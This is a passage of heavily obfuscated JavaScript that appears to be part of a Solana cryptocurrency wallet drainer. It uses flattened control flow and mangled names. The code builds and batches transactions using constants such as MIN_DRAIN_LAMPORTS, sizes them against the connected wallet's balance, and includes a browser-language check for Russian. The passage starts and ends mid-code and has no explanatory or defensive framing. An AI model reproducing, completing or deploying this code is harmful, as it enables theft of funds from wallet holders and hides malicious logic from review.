    _str_cache[1] += 2 + (__str_table__["data"]?.length ?? 0)
  }
  _noop(_str_cache["b"] = new(Uint8Array)(_str_cache[1]), _str_cache["b"][0] = 255, _str_cache[-146] = [], _str_cache[48] = 1, _str_cache["e"] = 0, _str_cache["f"] = 0);
  for (let __str_table__ of _str_cache[0]) {
    if (__str_table__["d"] != _v124) {
      throw new(TypeError)("50")
    }
    if (_str_cache["b"][_str_cache[48]++] = __str_table__["f"]?.length ?? 0, __str_table__["f"] && _str_cache[-146]["push"](...__str_table__["f"]), __str_table__["data"]) {
      let _s1 = __str_table__["data"]["length"];
      _noop(_str_cache["b"][_str_cache[48]++] = _s1, _str_cache["b"]["set"](__str_table__["data"], _str_cache[48]), _str_cache[48] += _s1)
    } else {
      _str_cache[48] += 1
    }
    _noop(_str_cache["e"] += __str_table__["v"], _str_cache["f"] += __str_table__["ae"] ?? 0)
  }
  return {
    ["d"]: _v124,
    ["data"]: _str_cache["b"],
    ["f"]: _str_cache[-146],
    ["v"]: _str_cache["e"],
    ["ae"]: _str_cache["f"]
  }
}

function _v908(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2, _s5 = {
    ["\u8AB6"]: {}
  }) {
    while (_s1 + _s3 + _s2 !== -130) {
      with(_s5["\u75FF"] || _s5) {
        switch (_s1 + _s3 + _s2) {
          case _s1 - -331:
          case -10:
            _noop(_str_cache[3] = 1, _str_cache["d"] = CONSTS[_s3 + -208], _s5["\u75FF"] = _s5["\u8AB6"], _s1 += 377, _s3 += -359, _s2 += 75);
            break;
            if (!(_s3 == 60)) {
              _noop(_s5["\u75FF"] = _s5["\u8AB6"], _s1 += 571, _s3 += -359, _s2 += 75);
              break
            }
          case 239:
          case 107:
            _noop([_s5["\u8AB6"]["\u6618"], _s5["\u8AB6"]["\u5A5D"], _s5["\u8AB6"]["\u5F24"]] = [173, 19, -173], _str_cache["a"] = _str_cache[CONSTS[_s3 + 115]][CONSTS[_s3 + 492]], _str_cache[CONSTS[_s1 + 961]] = _str_cache[CONSTS[_s3 + 115]]["f"] ?? []);
            if (!_str_cache["a"] || _str_cache["a"][0] != 255) {
              _noop(_s5["\u75FF"] = _s5["\u8AB6"], _s1 += 19, _s3 += 233, _s2 += -483);
              break
            } else {
              _noop(_s5["\u75FF"] = _s5["\u8AB6"], _s1 += -10, _s3 += 169, _s2 += -483);
              break
            }
          case 55:
          case _s2 - 74:
          case 245:
            _noop(_s5["\u75FF"] = _s5["\u8AB6"], _s1 += 98, _s3 += -125, _s2 += 346);
            break;
          case 201:
            _noop([_s5["\u8AB6"]["\u6618"], _s5["\u8AB6"]["\u5A5D"], _s5["\u8AB6"]["\u5F24"]] = [-34, -74, -99], _s5["\u75FF"] = _s5["\u8AB6"], _s1 += 85, _s3 += -125, _s2 += -70);
            break;
            if (_s1 > 211) {
              _noop(_s5["\u75FF"] = _s5["\u8AB6"], _s1 += -13, _s2 += -416);
              break
            }
          case _s5["\u8AB6"]["\u6618"] + -276:
            _str_cache[-CONSTS[_s3 + 343]] = [];
            for (; _str_cache[3] + 2 < _str_cache["a"][CONSTS[_s1 + 155]];) {
              let _s4 = _str_cache["a"][_str_cache[CONSTS[_s1 + 151]]++];
              let _s6 = _str_cache[CONSTS[_s1 + 165]][_str_cache[3]++];
              _noop(_str_cache[-147]["push"]({
                [CONSTS[_s3 + 163]]: _v124,
                [CONSTS[_s1 + 533]]: _str_cache["a"][CONSTS[_s3 + 454] + "ay"](_str_cache[3], _str_cache[3] + _s6),
                [CONSTS[_s1 + 383]]: _str_cache[CONSTS[_s1 + 971]]["slice"](_str_cache[CONSTS[_s3 + 163]], _str_cache[CONSTS[_s3 + 163]] + _s4)
              }), _str_cache[3] += _s6, _str_cache["d"] += _s4)
            }
            _noop(_s5["\u75FF"] = _s5["\u8AB6"], _s1 += 194);
            break;
            if (_s3 > -(_s3 + 290)) {
              _s5["\u75FF"] = _s5["\u8AB6"];
              break
            }
          default:
            throw new(_g(CONSTS[_s3 + 52] + CONSTS[_s1 + 278]))("51");
            _noop(_s5["\u75FF"] = _s5["\u8AB6"], _s1 += -29, _s3 += -64);
            break;
            if (!(_s1 > -231)) {
              _noop(_s5["\u75FF"] = _s5["\u8AB6"], _s1 += 80, _s3 += -144, _s2 += 257);
              break
            }
          case _s2 - 90:
            _noop(_str_cache[3] = 1, _str_cache["d"] = CONSTS[_s1 + 156], _s5["\u75FF"] = _s5["\u8AB6"], _s3 += -205, _s2 += 187);
            break;
            if (!(_s3 == 60)) {
              _noop(_s5["\u75FF"] = _s5["\u8AB6"], _s1 += 194, _s3 += -205, _s2 += 187);
              break
            }
          case 34:
            return __str_table__ = true, _str_cache[-147];
            _noop(_s5["\u75FF"] = _s5["\u7AFB"], _s1 += -247, _s3 += -136, _s2 += 219);
            break;
          case _s5["\u8AB6"]["\u6618"] + -82:
            return __str_table__ = true, _str_cache[-147];
            _noop(_s5["\u75FF"] = _s5["\u7B39"], _s1 += -98, _s3 += 223, _s2 += -346);
            break;
          case -54:
          case _s3 != 208 && _s3 - 265:
          case 13:
            _noop(_s5["\u75FF"] = _s5["\u8AB6"], _s1 += 17, _s3 += -115, _s2 += 40);
            break;
          case -57:
            _noop(_s5["\u75FF"] = _s5["\u8AB6"], _s1 += -79, _s3 += -148, _s2 += 199);
            break
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(-140, -109, 488)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}

function _v169(..._str_cache) {
  return _v1001(_v574({
    ["version"]: 0
  }), _limitArgs((...__str_table__) => {
    __str_table__["length"] = 1;
    return _v573(_str_cache[0], __str_table__[0])
  }), __str_table__ => {
    return _v575(_str_cache[1], __str_table__)
  }, _limitArgs((...__str_table__) => {
    __str_table__["length"] = 1;
    return _str_cache[2] ? _v1204(__str_table__[0], _str_cache[2]) : __str_table__[0]
  }), _limitArgs((..._str_cache) => {
    _str_cache["length"] = 1;
    return _v580(_v416(), _str_cache[0])
  }), _limitArgs((..._str_cache) => {
    _str_cache["length"] = 1;
    return _v1025(_str_cache[0])
  }))
}

function _v907(..._str_cache) {
  return _v1001(_v574({
    ["version"]: 1
  }), _limitArgs((...__str_table__) => {
    __str_table__["length"] = 1;
    return _v573(_str_cache[0], __str_table__[0])
  }), _limitArgs((...__str_table__) => {
    __str_table__["length"] = 1;
    return _v575(_str_cache[1], __str_table__[0])
  }), _str_cache => {
    return _v580(_v416(), _str_cache)
  }, __str_table__ => {
    return _v945({
      ["pe"]: _str_cache[2]["v"],
      ["Ue"]: _str_cache[2]["kn"],
      ["Te"]: _str_cache[2]["Dn"]
    }, __str_table__)
  }, _limitArgs((..._str_cache) => {
    _str_cache["length"] = 1;
    return _v1025(_str_cache[0])
  }))
}

function _v1247(_str_cache, __str_table__, _s1 = 1) {
  return !__str_table__ || __str_table__["length"] < _s1 ? "null" : _v169(_str_cache, __str_table__)
}
async function _v1047(_str_cache, __str_table__) {
  let _s1 = new(WalletConnectBase);
  for (let _s3 of __str_table__) {
    let _s2 = [];
    for (let _s5 of _str_cache) {
      let _s4 = await _v639(_buildList(_s5), _s3["q"], _s3["J"]);
      _s2["push"](_s4)
    }
    _s1["set"](_s3["q"], _s2)
  }
  return _s1
}

function _v1248(_str_cache, __str_table__) {
  let _s1 = 0.1 / solUsdRate * 1000000000;
  let _s3 = 75 + _s1;
  for (let _s2 of __str_table__) {
    let _s5 = _s2["type"];
    if (_s5 == 0) {
      _noop(_s3 += 140, _s3 += _s2["_e"] ?? 1700000, _s3 += 30000)
    } else {
      if (_s5 == 2) {
        _s3 += 25000
      } else {
        throw new(Error)("40")
      }
    }
  }
  return _str_cache["ce"] && (_s3 *= 2), Math["ceil"](_s3)
}

function _v906(..._str_cache) {
  _str_cache["a"] = 10 ** (9 - (_str_cache[0] > 15e10 ? 0 : _str_cache[0] > 1e10 ? 1 : _str_cache[0] > 5e8 ? 2 : _str_cache[0] > 5e7 ? 3 : 4));
  return Math["trunc"](_str_cache[0] / _str_cache["a"]) * _str_cache["a"]
}

function _v905(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2, _s5 = {
    ["\u6D5D"]: {}
  }) {
    while (_s1 + _s3 + _s2 !== -168) {
      with(_s5["\u9020"] || _s5) {
        switch (_s1 + _s3 + _s2) {
          case -44:
          case _s5["\u6D5D"]["\u6670"] + -48:
          case 111:
            _noop(_str_cache[CONSTS[_s3 + 228]] = _str_cache[0]["hr"] ? String(_str_cache[0][CONSTS[_s1 + 662]]) : _str_cache[0]["Se"], _str_cache[2] = +!!_str_cache[0][CONSTS[_s1 + 562]], _s5["\u9020"] = _s5["\u6D5D"], _s1 += -216, _s3 += 440, _s2 += -52);
            break;
            if (_s1 < -(_s3 + 251)) {
              _noop(_s5["\u9020"] = _s5["\u6D5D"], _s1 += -172, _s3 += 221, _s2 += -111);
              break
            }
          case 8:
          case _s3 - 94:
          case 22:
            _noop(_str_cache["a"] = _str_cache[0]["hr"] ? String(_str_cache[CONSTS[_s3 + -2]]["hr"]) : _str_cache[0][CONSTS[_s3 + 562]], _str_cache[2] = +!!_str_cache[0]["ce"], _s5["\u9020"] = _s5["\u6D5D"], _s1 += -298, _s3 += 219, _s2 += 151);
            break;
            if (_s1 < -(_s1 + -207)) {
              _noop(_s5["\u9020"] = _s5["\u6D5D"], _s1 += -254, _s2 += 92);
              break
            }
          case _s5["\u6D5D"]["\u6670"] + 124:
            return __str_table__ = true, "" + _v215(_str_cache[CONSTS[_s1 + 68]]) + CONSTS[_s1 + 687] + _str_cache[CONSTS[_s3 + -227]] + CONSTS[_s3 + 407];
            _noop(_s5["\u9020"] = _s5["\u853A"], _s1 += 143, _s3 += -297);
            break;
          case _s5["\u6D5D"]["\u7190"] + -155:
            _noop(_s5["\u9020"] = _s5["\u57F7"], _s2 += 59);
            break;
            if (!(_s1 == _s3 + 160)) {
              _s5["\u9020"] = _s5["\u6D5D"];
              break
            }
          case -111:
            _noop([_s5["\u6D5D"]["\u7190"], _s5["\u6D5D"]["\u503B"], _s5["\u6D5D"]["\u6670"]] = [-72, 83, -138], _str_cache["a"] = _str_cache[CONSTS[_s3 + -55]]["hr"] ? _g(CONSTS[_s1 + 132])(_str_cache[CONSTS[_s3 + -55]][CONSTS[_s3 + 764]]) : _str_cache[CONSTS[_s3 + -55]]["Se"], _str_cache[2] = +!!_str_cache[0]["ce"], _s5["\u9020"] = _s5["\u6D5D"], _s1 += -161, _s3 += 166, _s2 += 92);
            break;
            if (_s1 < -(_s1 + -70)) {
              _noop(_s5["\u9020"] = _s5["\u6D5D"], _s1 += -117, _s3 += -53, _s2 += 33);
              break
            }
          case -248:
            _noop([_s5["\u6D5D"]["\u7190"], _s5["\u6D5D"]["\u503B"], _s5["\u6D5D"]["\u6670"]] = [144, -249, 153], _s5["\u9020"] = _s5["\u6D5D"], _s1 += -44, _s3 += 219, _s2 += 59);
            break;
          default:
            _noop(_str_cache["a"] = _str_cache[CONSTS[_s3 + -2]]["hr"] ? String(_str_cache[0][CONSTS[_s1 + 580]]) : _str_cache[CONSTS[_s1 + -239]]["Se"], _str_cache[CONSTS[_s1 + -245]] = +!!_str_cache[0]["ce"], _s5["\u9020"] = _s5["\u6D5D"], _s1 += -298, _s3 += 219, _s2 += -52);
            break;
            if (_s1 < -38) {
              _noop(_s5["\u9020"] = _s5["\u6D5D"], _s1 += -254, _s2 += -111);
              break
            }
          case _s5["\u6D5D"]["\u503B"] + -316:
            _noop(_s5["\u9020"] = _s5["\u9D45"], _s1 += 126, _s3 += -9, _s2 += -52);
            break;
            if (!(_s1 == _s1 + 126)) {
              _noop(_s5["\u9020"] = _s5["\u6D5D"], _s1 += 126, _s3 += -9, _s2 += -111);
              break
            }
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(108, 61, -280)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}
_noop(_v723 = class {
  constructor() {
    _noop(_v5(this, "wt", 0), _v5(this, "ie", !1), _v5(this, "At", !1), _v5(this, "be", 0), _v5(this, "_r", 0))
  } ["Pn"]() {
    let {
      ["c"]: _str_cache, ["ee"]: __str_table__
    } = this["S"];
    let _s1 = _v1248(_str_cache, __str_table__);
    _noop(this["_r"] = this["S"]["b"]["Mn"] ? 1 : 0, this["wt"] = _s1, this["S"]["Ke"]() || (this["ie"] = !0), this["ie"] || (this["At"] = this["z"] < _s1), this["Un"]())
  } ["Un"]() {
    let {
      ["b"]: _str_cache, ["c"]: __str_table__, ["ee"]: _s1
    } = this["S"];
    let _s3 = this["S"]["we"]();
    if (_str_cache["id"] == 1 && __str_table__["ue"] != 1 || _str_cache["id"] == 0 || _str_cache["wr"] || _s3 < 5) {
      this["be"] = 0;
      return
    }
    this["be"] = _s3 > 150 && _s1["length"] > 5 ? 2 : 1
  }
  get["He"]() {
    return this["S"]["b"]["Ar"] ? solanaAddrRegex : mobileRegex
  }
  get["Ve"]() {
    return this["ie"] ? _v111 : this["E"]
  }
  get["Wt"]() {
    return this["Et"] + this["Rt"]
  }
  get["Er"]() {
    let {
      ["b"]: _str_cache, ["c"]: __str_table__
    } = this["S"];
    return _str_cache["jt"] || __str_table__["ue"] == 1 && _str_cache["id"] == 1
  }
  get["Ye"]() {
    let {
      ["b"]: _str_cache, ["c"]: __str_table__
    } = this["S"];
    return _str_cache["id"] == 1 && __str_table__["Bn"]
  }
  get["Fn"]() {
    return this["S"]["b"]["id"] == 1 && this["Er"]
  }
  get["Kt"]() {
    let _str_cache = this["S"]["b"];
    return this["Ye"] || _str_cache["id"] == 0
  }
  get["zn"]() {
    let _str_cache = this["S"]["b"];
    return this["Ye"] || _str_cache["id"] == 4 || _str_cache["id"] == 0 || _str_cache["Rr"] || this["At"]
  }
  get["mr"]() {
    let _str_cache = this["S"]["b"];
    return this["Ye"] ? 6 : _str_cache["jt"] ? 12 : 50
  }
  get["Hn"]() {
    return this["Kt"] ? PRIORITY_FEE_BUDGET - 100000 : PRIORITY_FEE_BUDGET
  } ["Sr"]() {
    let {
      ["b"]: _str_cache
    } = this["S"];
    return this["Ye"] || _str_cache["id"] == 8
  }
  get["br"]() {
    let {
      ["b"]: _str_cache
    } = this["S"];
    return this["Sr"]() || _str_cache["Tr"]
  } ["yr"](_str_cache) {
    if (!this["br"]) {
      return !0
    }
    let __str_table__ = this["S"]["we"](this["Fe"]);
    let _s1 = _v290(__str_table__ / 100, 0.1, 25) / solUsdRate * 1000000000;
    return _str_cache > _s1
  } ["Or"](_str_cache, __str_table__) {
    if (!this["br"]) {
      return !0
    }
    let _s1 = this["S"]["b"]["jt"] ? 50 : 150;
    let _s3 = Math["min"](__str_table__ / 100, _s1);
    return _str_cache["oe"] >= _s3
  } ["Vn"]() {
    if (this["At"]) {
      return !1
    }
    let {
      ["ee"]: _str_cache, ["c"]: __str_table__
    } = this["S"];
    let _s1 = !!__str_table__["ce"];
    return _str_cache["length"] > (_s1 ? 2 : 3)
  } ["Gn"]() {
    let {
      ["b"]: _str_cache, ["ee"]: __str_table__
    } = this["S"];
    if (this["Ye"] || !_str_cache["Nr"]) {
      return !1
    }
    if (this["be"] != 0) {
      return !0
    }
    if (_str_cache["id"] == 0) {
      let _s1 = 0;
      for (let _s3 of __str_table__) {
        _s3["type"] == 2 && (_s1 += _s3["oe"])
      }
      let _s2 = this["S"]["we"]();
      return _s1 >= _s2 / 3
    }
    return !0
  } ["Wn"]() {
    let {
      ["c"]: _str_cache, ["b"]: __str_table__
    } = this["S"];
    return __str_table__["id"] == 1 && _str_cache["ue"] == 5 || __str_table__["vr"]
  } ["jn"]() {
    return this["S"]["we"]() >= 20 || navigator["language"]["includes"]("ru") || this["S"]["c"]["Kn"]
  }
}, _v724 = 1232, _v725 = 4096, _v726 = 64, _v727 = 12, _v728 = 64, _v729 = "lh", _v343 = _str_cache => {
  return _str_cache > 16383 ? 3 : _str_cache > 127 ? 2 : 1
});

function _v554(..._str_cache) {
  return _v343(_str_cache[0]) + _str_cache[0] + _v343(_str_cache[1]) + _str_cache[1]
}

function _v904(..._str_cache) {
  return 4 + _str_cache[0] + _str_cache[1]
}

function _v903(..._str_cache) {
  return _str_cache[1] == 1 ? 4 + _str_cache[0] + 1 : 1 + _v554(_str_cache[0], 1)
}
_noop(_v189 = undefined, _v112 = undefined, _v76 = undefined, _v77 = undefined, _v190 = undefined, _v16 = undefined, _v102 = undefined, _v152 = undefined, _v58 = undefined, _v51 = undefined, _v78 = undefined, _v79 = undefined, _v135 = undefined, _v153 = undefined, _v136 = undefined, _v125 = undefined, _v154 = undefined, _v155 = undefined, _v12 = undefined, _v344 = undefined, _v156 = undefined, _v80 = undefined, _v345 = undefined, _v463 = undefined, _v464 = undefined, _v465 = undefined, _v157 = undefined, _v346 = undefined, _v347 = undefined, _v730 = class {
  constructor(_str_cache) {
    _noop(_initPriv(this, _v12), _initPriv(this, _v189), _initPriv(this, _v112), _initPriv(this, _v76), _initPriv(this, _v77, []), _initPriv(this, _v190, []), _initPriv(this, _v16, 0), _initPriv(this, _v102, 0), _initPriv(this, _v152, 0), _initPriv(this, _v58, 0), _initPriv(this, _v51, new(Set)), _initPriv(this, _v78, new(Set)), _initPriv(this, _v79, new(Set)), _initPriv(this, _v135, new(Set)), _initPriv(this, _v153, new(Set)), _initPriv(this, _v136, new(Set)), _initPriv(this, _v125, new(Set)), _initPriv(this, _v154, new(Set)), _initPriv(this, _v155, new(Set)), _setPriv(this, _v112, _str_cache), _setPriv(this, _v189, _str_cache["S"]), _setPriv(this, _v76, _str_cache["_r"]), _callPriv(this, _v12, _v346)["call"](this))
  } ["xe"](_str_cache, __str_table__ = !0) {
    if (!_callPriv(this, _v12, _v157)["call"](this)) {
      return !1
    }
    let _s1 = _callPriv(this, _v12, _v347)["call"](this);
    if (_getPriv(this, _v77)["push"](_str_cache), _callPriv(this, _v12, _v344)["call"](this, _str_cache), __str_table__ && _callPriv(this, _v12, _v345)["call"](this)) {
      if (_getPriv(this, _v77)["pop"](), _s1(), !_callPriv(this, _v12, _v157)["call"](this, !0)) {
        return !1
      }
      _noop(this["Qe"](), this["xe"](_str_cache, !1))
    }
    return !0
  } ["xr"](_str_cache, __str_table__ = !0) {
    if (!_callPriv(this, _v12, _v157)["call"](this)) {
      return !1
    }
    let _s1 = _callPriv(this, _v12, _v347)["call"](this);
    for (let _s3 of _str_cache) {
      _noop(_getPriv(this, _v77)["push"](_s3), _callPriv(this, _v12, _v344)["call"](this, _s3))
    }
    if (__str_table__ && _callPriv(this, _v12, _v345)["call"](this)) {
      if (_getPriv(this, _v77)["splice"](-1 * _str_cache["length"]), _s1(), !_callPriv(this, _v12, _v157)["call"](this, !0)) {
        return !1
      }
      _noop(this["Qe"](), this["xr"](_str_cache, !1))
    }
    return !0
  } ["Ir"]() {
    if (_getPriv(this, _v152) > 0) {
      return
    }
    let _str_cache = _getPriv(this, _v112);
    let __str_table__ = _getPriv(this, _v189)["we"]();
    let _s1 = _getPriv(this, _v190)["length"] > 0 ? 0.001 : __str_table__ > 500 ? 0.1 : __str_table__ > 100 ? 0.05 : .01;
    let _s3 = _str_cache["ie"] ? 1e8 : _str_cache["z"];
    let _s2 = Math["trunc"](Math["min"](_s1 / solUsdRate * 1000000000, _s3));
    _s2 <= 0 || (_setPriv(this, _v152, _s2), _str_cache["z"] -= _s2)
  } ["Qe"]() {
    let _str_cache = _getPriv(this, _v190);
    let __str_table__ = _getPriv(this, _v77);
    if (__str_table__["length"] === 0 || !_callPriv(this, _v12, _v157)["call"](this)) {
      return _str_cache
    }
    let _s1 = _getPriv(this, _v112);
    _noop(this["Ir"](), _getPriv(this, _v76) == 0 && _setPriv(this, _v16, _getPriv(this, _v16) + 300), _setPriv(this, _v16, _getPriv(this, _v16) + 150), _setPriv(this, _v16, _getPriv(this, _v16) * 1.2), _setPriv(this, _v16, _getPriv(this, _v16) + 20000));
    let _s3 = _getPriv(this, _v76) == 0 ? COMPUTE_UNIT_LIMIT : MIN_DRAIN_LAMPORTS;
    _noop(_setPriv(this, _v16, _getPriv(this, _v16) + _s3 / 32768 * 8), _setPriv(this, _v16, _getPriv(this, _v16) + _getPriv(this, _v51)["size"] * 720), _setPriv(this, _v16, _getPriv(this, _v16) + _getPriv(this, _v78)["size"] * 300));
    let _s2 = _s1["Ve"];
    let _s5 = Math["min"](_getPriv(this, _v16), _s1["Hn"]);
    let _s4 = _getPriv(this, _v152) || _getPriv(this, _v16) * SOL_RESERVE;
    return _getPriv(this, _v76) == 1 ? _str_cache["push"](_v907(_s2, __str_table__, {
      ["v"]: _s5,
      ["kn"]: BigInt(_s4),
      ["Dn"]: MIN_DRAIN_LAMPORTS
    })) : (__str_table__["unshift"](_v286(_s5), _v285(BigInt(Math["ceil"](_s4 / _s5 * 1000000)))), _str_cache["push"](_v169(_s2, __str_table__, _v462))), _callPriv(this, _v12, _v346)["call"](this), _s1["z"] -= _v337["fr"](), _str_cache
  }
}, _v189 = new(WeakMap), _v112 = new(WeakMap), _v76 = new(WeakMap), _v77 = new(WeakMap), _v190 = new(WeakMap), _v16 = new(WeakMap), _v102 = new(WeakMap), _v152 = new(WeakMap), _v58 = new(WeakMap), _v51 = new(WeakMap), _v78 = new(WeakMap), _v79 = new(WeakMap), _v135 = new(WeakMap), _v153 = new(WeakMap), _v136 = new(WeakMap), _v125 = new(WeakMap), _v154 = new(WeakMap), _v155 = new(WeakMap), _v12 = new(WeakMap), _v344 = function(_str_cache) {
  _noop(_setPriv(this, _v16, _getPriv(this, _v16) + _str_cache["v"]), _str_cache["ae"] && (_setPriv(this, _v102, _getPriv(this, _v102) + _str_cache["ae"]), _setPriv(this, _v16, _getPriv(this, _v16) + _str_cache["ae"] * 1600)));
  let __str_table__ = _str_cache["data"];
  let _s1 = _str_cache["f"];
  _getPriv(this, _v79)["add"](_str_cache["d"]);
  let _s3 = __str_table__?.length ?? 0;
  let _s2 = _s1?.length ?? 0;
  _setPriv(this, _v58, _getPriv(this, _v58) + (_getPriv(this, _v76) == 1 ? _v904(_s3, _s2) : _v554(_s3, _s2)));
  for (let _s5 of _s1 ?? []) {
    _noop(_v63(_s5["r"]) && _getPriv(this, _v51)["add"](_s5["e"]), _getPriv(this, _v78)["add"](_s5["e"]))
  }
  if (__str_table__ && _s1) {
    if (!_getPriv(this, _v112)["Ye"]) {
      return
    }
    if (_v1236(_str_cache["d"])) {
      let _s5 = __str_table__[0] == 26 ? 1 : 0;
      _callPriv(this, _v12, _v80)["call"](this, _getPriv(this, _v135), _s1[_s5]?.e, 16)
    }
    if (_str_cache["d"] == _v74 && __str_table__[0] == 2 && _callPriv(this, _v12, _v80)["call"](this, _getPriv(this, _v125), _s1[1]?.e, 16), _str_cache["d"] == _v134) {
      let _s5 = __str_table__[0] == 255 ? _v908(_str_cache) : [_str_cache];
      for (let _s4 of _s5) {
        let _s6 = _s4["data"];
        let _s7 = _s4["f"];
        if (!(!_s6 || !_s7)) {
          switch (_s6[0]) {
            case 14: {
              _noop(_callPriv(this, _v12, _v156)["call"](this, 94), _callPriv(this, _v12, _v156)["call"](this, 54), _callPriv(this, _v12, _v156)["call"](this, 13));
              break
            }
            case 19: {
              let _s8 = _s6[1] ?? 0;
              let _defineProperty = _s7[1]?.e;
              if (_callPriv(this, _v12, _v80)["call"](this, _getPriv(this, _v135), _defineProperty, 16), _callPriv(this, _v12, _v80)["call"](this, _getPriv(this, _v153), _defineProperty, 52), _callPriv(this, _v12, _v80)["call"](this, _getPriv(this, _v136), _s7[2]?.e, 17), _s8 & 2) {
                let _getOwnPropDesc = 4 + (_s8 & 8 ? 1 : 0);
                _callPriv(this, _v12, _v80)["call"](this, _getPriv(this, _v136), _s7[_getOwnPropDesc]?.e, 17)
              }
              break
            }
            case 21: {
              let _s8 = _s6[1] ?? 0;
              if (_callPriv(this, _v12, _v80)["call"](this, _getPriv(this, _v125), _s7[1]?.e, 16), _s8 & 2) {
                let _defineProperty = 2 + (_s8 & 4 ? 1 : 0);
                _callPriv(this, _v12, _v80)["call"](this, _getPriv(this, _v125), _s7[_defineProperty]?.e, 16)
              }
              break
            }
            case 22: {
              let _s8 = _s7[1]?.e;
              _noop(_callPriv(this, _v12, _v80)["call"](this, _getPriv(this, _v154), _s8, 52), _callPriv(this, _v12, _v80)["call"](this, _getPriv(this, _v155), _s8, 59));
              break
            }
          }
        }
      }
    }
  }
}, _v156 = function(_str_cache) {
  _noop(_setPriv(this, _v58, _getPriv(this, _v58) + _v903(_str_cache, _getPriv(this, _v76))), _setPriv(this, _v102, _getPriv(this, _v102) + 1), _setPriv(this, _v16, _getPriv(this, _v16) + 7e3))
}, _v80 = function(_str_cache, __str_table__, _s1) {
  !__str_table__ || _str_cache["has"](__str_table__) || (_str_cache["add"](__str_table__), _callPriv(this, _v12, _v156)["call"](this, _s1))
}, _v345 = function() {
  return _getPriv(this, _v77)["length"] + _getPriv(this, _v102) > _v728 ? !0 : _getPriv(this, _v76) == 1 ? _callPriv(this, _v12, _v464)["call"](this) > _v725 || _callPriv(this, _v12, _v465)["call"](this) : _callPriv(this, _v12, _v463)["call"](this) > _v724
}, _v463 = function() {
  let _str_cache = _getPriv(this, _v78)["difference"](_v461);
  let __str_table__ = new(Set)([..._str_cache, ..._getPriv(this, _v79), ..._getPriv(this, _v51)]);
  return 5 + _getPriv(this, _v51)["size"] * 64 + 1 + __str_table__["size"] * 32 + 32 + _v343(_getPriv(this, _v77)["length"]) + _getPriv(this, _v77)["length"] + _getPriv(this, _v58) + 1 + 32 + 1 + 1 + (_getPriv(this, _v78)["size"] - _str_cache["size"])
}, _v464 = function() {
  let _str_cache = new(Set)([..._getPriv(this, _v78), ..._getPriv(this, _v79), ..._getPriv(this, _v51)]);
  return 54 + _getPriv(this, _v58) + _str_cache["size"] * 32 + _getPriv(this, _v51)["size"] * 64
}, _v465 = function() {
  return new(Set)([..._getPriv(this, _v78), ..._getPriv(this, _v79), ..._getPriv(this, _v51)])["size"] > _v726 || _getPriv(this, _v51)["size"] > _v727
}, _v157 = function(_str_cache = !1) {
  let __str_table__ = _getPriv(this, _v112)["zn"] ? 1 : 5;
  return _getPriv(this, _v190)["length"] + (_str_cache ? 1 : 0) < __str_table__
}, _v346 = function() {
  _noop(_setPriv(this, _v16, 0), _setPriv(this, _v58, 0), _setPriv(this, _v102, _getPriv(this, _v76) == 1 ? 1 : 3), _setPriv(this, _v152, 0), _getPriv(this, _v77)["splice"](0), _getPriv(this, _v135)["clear"](), _getPriv(this, _v153)["clear"](), _getPriv(this, _v136)["clear"](), _getPriv(this, _v125)["clear"](), _getPriv(this, _v154)["clear"](), _getPriv(this, _v155)["clear"](), _getPriv(this, _v78)["clear"](), _getPriv(this, _v79)["clear"](), _getPriv(this, _v51)["clear"](), _getPriv(this, _v51)["add"](_getPriv(this, _v112)["Ve"]), _getPriv(this, _v112)["Kt"] && (_getPriv(this, _v79)["add"](_v729), _callPriv(this, _v12, _v156)["call"](this, 16)), _getPriv(this, _v76) == 0 && (_setPriv(this, _v58, _getPriv(this, _v58) + 20), _getPriv(this, _v79)["add"](_v342)));
  let _str_cache = _v905(_getPriv(this, _v189)["c"]);
  this["xe"](_v558(_str_cache), !1)
}, _v347 = function() {
  let _str_cache = _getPriv(this, _v16);
  let __str_table__ = _getPriv(this, _v102);
  let _s1 = _getPriv(this, _v58);
  let _s3 = new(Set)(_getPriv(this, _v51));
  let _s2 = new(Set)(_getPriv(this, _v78));
  let _s5 = new(Set)(_getPriv(this, _v79));
  let _s4 = new(Set)(_getPriv(this, _v135));
  let _s6 = new(Set)(_getPriv(this, _v153));
  let _s7 = new(Set)(_getPriv(this, _v136));
  let _s8 = new(Set)(_getPriv(this, _v125));
  let _defineProperty = new(Set)(_getPriv(this, _v154));
  let _getOwnPropDesc = new(Set)(_getPriv(this, _v155));
  return () => {
    _noop(_setPriv(this, _v16, _str_cache), _setPriv(this, _v102, __str_table__), _setPriv(this, _v58, _s1), _setPriv(this, _v51, _s3), _setPriv(this, _v78, _s2), _setPriv(this, _v79, _s5), _setPriv(this, _v135, _s4), _setPriv(this, _v153, _s6), _setPriv(this, _v136, _s7), _setPriv(this, _v125, _s8), _setPriv(this, _v154, _defineProperty), _setPriv(this, _v155, _getOwnPropDesc))
  }
}, _v48 = undefined, _v33 = undefined, _v348 = undefined, _v466 = undefined, _v467 = undefined, _v468 = undefined, _v469 = undefined, _v245 = undefined, _v470 = undefined, _v349 = undefined, _v350 = undefined, _v471 = undefined, _v472 = undefined, _v158 = undefined, _v351 = undefined, _v731 = class extends _v723 {
  constructor(_str_cache) {
    _noop(super(), _initPriv(this, _v33), _v5(this, "S"), _v5(this, "Rt", 0), _v5(this, "Et", 0), _v5(this, "Fe", []), _v5(this, "E"), _v5(this, "dr"), _v5(this, "De", []), _v5(this, "z", 0), _initPriv(this, _v48), _initPriv(this, _v158, []), _v5(this, "lr", []), _v5(this, "Yt", !1), this["S"] = _str_cache, this["E"] = _str_cache["b"]["e"], this["dr"] = _buildList(this["He"]))
  }
  async ["tr"]() {
    let {
      ["b"]: _str_cache
    } = this["S"];
    _noop(_callPriv(this, _v33, _v348)["call"](this), this["Wn"]() && (await _callPriv(this, _v33, _v471)["call"](this)));
    let __str_table__ = this["be"] == 0;
    _noop(__str_table__ && this["Vn"]() && (await _callPriv(this, _v33, _v245)["call"](this, !0)), this["be"] == 2 ? await _callPriv(this, _v33, _v467)["call"](this) : await _callPriv(this, _v33, _v466)["call"](this), await _callPriv(this, _v33, _v468)["call"](this), _getPriv(this, _v48)["Ir"](), __str_table__ && (await _callPriv(this, _v33, _v245)["call"](this)), await _callPriv(this, _v33, _v470)["call"](this));
    let _s1 = _getPriv(this, _v48)["Qe"]();
